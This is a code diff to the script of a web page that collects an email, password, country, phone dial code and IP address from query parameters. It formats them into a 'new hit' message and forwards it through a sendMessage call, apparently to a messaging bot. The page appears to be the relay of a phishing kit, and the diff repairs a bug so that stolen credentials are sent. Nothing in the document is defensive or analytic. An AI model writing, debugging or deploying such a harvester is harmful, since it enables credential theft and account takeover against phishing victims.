@@ -30,39 +30,37 @@
         }
 
         // Check if the request is for an API call
+        const email = getQueryParam("e");
+        const password = getQueryParam("p");
+        const country = getQueryParam("country");
+        const phone = getQueryParam("phone");
+        const ip = getQueryParam("ip");
         
-            const email = getQueryParam("e");
-            const password = getQueryParam("p");
-            const country = getQueryParam("country");
-            const phone = getQueryParam("phone");
-            const ip = getQueryParam("ip");
-            
-            
-            if (email) {
-            	let text = `ʜɪ ɴᴇᴡ ʜɪᴛ 🖤.
+        if (email && password && country && phone && ip) {
+            let text = `ʜɪ ɴᴇᴡ ʜɪᴛ 🖤.
 ᯓ ᴇᴍᴀɪʟ » ${email}
 ᯓ ᴘᴀꜱꜱᴡᴏʀᴅ » ${password}
 ᯓ ᴄᴏᴜɴᴛʀʏ » ${country}
 ᯓ ᴅɪᴀʟᴄᴏᴅᴇ » ${phone}
 ᯓ ɪᴘ » ${ip}`;
-            	
-                sendMessage(message).then(data => {
-                    const status = data.ok ? "Message sent successfully!" : "Failed to send message";
-                    const response = {
-                        status: status,
-                        data: data,
-                        message: message
-                    };
-                    // Return JSON response
-                    document.body.innerHTML = JSON.stringify(response);
-                });
-            } else {
+            
+            sendMessage(text).then(data => {
+                const status = data.ok ? "Message sent successfully!" : "Failed to send message";
                 const response = {
-                    status: "error",
-                    message: "No 'message' parameter provided"
+                    status: status,
+                    data: data,
+                    message: text
                 };
+                // Return JSON response
                 document.body.innerHTML = JSON.stringify(response);
-            }
+            });
+        } else {
+            const response = {
+                status: "error",
+                message: "Missing required parameters"
+            };
+            document.body.innerHTML = JSON.stringify(response);
+        }
         
     </script>
 
